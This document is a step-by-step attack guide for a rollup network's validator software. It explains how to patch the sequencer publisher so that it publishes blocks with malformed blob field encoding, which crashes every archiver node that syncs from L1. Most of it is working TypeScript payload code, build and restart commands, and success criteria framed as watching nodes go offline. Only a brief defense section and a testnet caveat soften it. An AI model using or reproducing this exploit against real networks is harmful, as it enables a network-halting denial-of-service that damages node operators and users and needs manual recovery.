# Blob Deserialization Attack - Implementation Guide

## Attack Overview
Cause all nodes to crash when syncing blocks from L1 by publishing a block with malformed blob encoding that passes all validation but crashes the archiver's deserialization.

## Technical Details

### Vulnerability Location
- **File**: `yarn-project/blob-lib/src/encoding.ts:79-86`
- **Function**: `getLengthFromFirstField()`
- **Issue**: Throws error on invalid prefix, crashes archiver during L1 sync

### Attack Vector
The blob encoding happens in `sequencer-publisher.ts:510`:
```typescript
const blobs = await Blob.getBlobsPerBlock(block.body.toBlobFields());
```

This automatically encodes fields correctly, so you must **modify your validator node code** to inject malformed fields.

## Step-by-Step Attack

### 1. Locate Your Validator Code

Your validator is running `yarn-project/sequencer-client`. Find the file:
```bash
cd yarn-project/sequencer-client/src/publisher
```

### 2. Modify sequencer-publisher.ts

Around line 510, replace the blob creation with malicious fields:

```typescript
// ORIGINAL CODE (line ~510):
const blobs = await Blob.getBlobsPerBlock(block.body.toBlobFields());

// REPLACE WITH:
const maliciousFields = this.createMalformedBlobFields(block);
const blobs = await Blob.getBlobsPerBlock(maliciousFields);
```

### 3. Add the Malicious Field Generator

Add this method to the `SequencerPublisher` class:

```typescript
private createMalformedBlobFields(block: L2Block): Fr[] {
  // Get normal fields from the block
  const normalFields = block.body.toBlobFields();

  // Attack Option 1: Invalid revert code (easiest)
  // The revert code must be 0-4, so we set it to 5
  const maliciousFirstField = new Fr(0x74785f7374617274_00_0001_00_01_00_05n);
  //                                   ^TX_START  ^pad ^len ^pad^RC ^pad^INVALID=5

  // Replace the first field with our malicious one
  const maliciousFields = [...normalFields];
  maliciousFields[0] = maliciousFirstField;

  return maliciousFields;
}
```

### 4. Alternative Attack: Length Overflow

For a more subtle attack that's harder to debug:

```typescript
private createMalformedBlobFields(block: L2Block): Fr[] {
  const normalFields = block.body.toBlobFields();

  // Create a field with a length that exceeds the blob size
  // This will cause the parser to skip beyond the end of the blob
  const maliciousFirstField = new Fr(0x74785f7374617274_00_FFFF_00_01_00_01n);
  //                                   ^TX_START  ^pad ^len=65535! ^valid RC

  const maliciousFields = [...normalFields];
  maliciousFields[0] = maliciousFirstField;

  return maliciousFields;
}
```

### 5. Rebuild Your Validator

```bash
cd yarn-project/sequencer-client
yarn build

# Or rebuild entire project:
cd ../..
./yarn-project/bootstrap.sh compile
```

### 6. Restart Your Validator

Restart your validator node with the modified code. When it proposes the next block:
- Block building will succeed (no validation of field structure)
- Re-execution will succeed (other validators verify state, not field structure)
- L1 will accept it (only validates KZG commitments)
- Block will be published to L1

### 7. Watch Nodes Crash

When other nodes try to sync from L1:
1. They call `getBlockFromRollupTx()` in `archiver/data_retrieval.ts:289`
2. Line 350: `Blob.toEncodedFields()` is called
3. Line 350-358: Deserialization fails
4. `logger.fatal()` called and exception thrown
5. **Node crashes**

## Why This Works

### ✓ Bypasses Validator Checks
- Block builder doesn't validate blob field encoding
- Re-execution validates state transitions, not field structure
- No validation in `BlockProposalHandler`

### ✓ Bypasses L1 Checks
- L1 only validates KZG commitments and signatures
- L1 doesn't parse field-level structure
- See `Rollup.sol:validateHeaderWithAttestations()`

### ✓ Crashes Archivers
- First time fields are deserialized is in archiver
- No error recovery - fatal log and throw
- All nodes trying to sync will crash

## Detection After Attack

Look for these logs in other nodes:
```
[archiver] FATAL: Unable to sync: failed to decode fetched blob, this blob was likely not created by us
[archiver] Error: Invalid prefix
```

## Defense (What Devs Should Add)

Add validation in `BlockProposalHandler.handleBlockProposal()`:

```typescript
// After line 361 in data_retrieval.ts:
try {
  // Validate blob fields can be deserialized
  const testFields = Blob.toEncodedFields(blobBodies.map(b => b.blob));
  Body.fromBlobFields(testFields);
} catch (err) {
  throw new Error('Invalid blob field encoding');
}
```

Or add validation during block building before proposal creation.

## Important Notes

⚠️ **This is a network-halting attack** - use only on testnets for security research
⚠️ You must be a validator/proposer to execute this
⚠️ The block will be permanently on L1, nodes can't sync past it without code changes
⚠️ Network recovery requires either:
   - Code update to skip the bad block
   - Code update to handle deserialization errors gracefully
   - Manual rollback/fork

## Success Criteria

Attack succeeds if:
1. Your malicious block is accepted and published to L1
2. Other nodes crash when trying to sync past your block
3. Network cannot progress without intervention

Monitor the network to see nodes go offline as they try to sync your block.
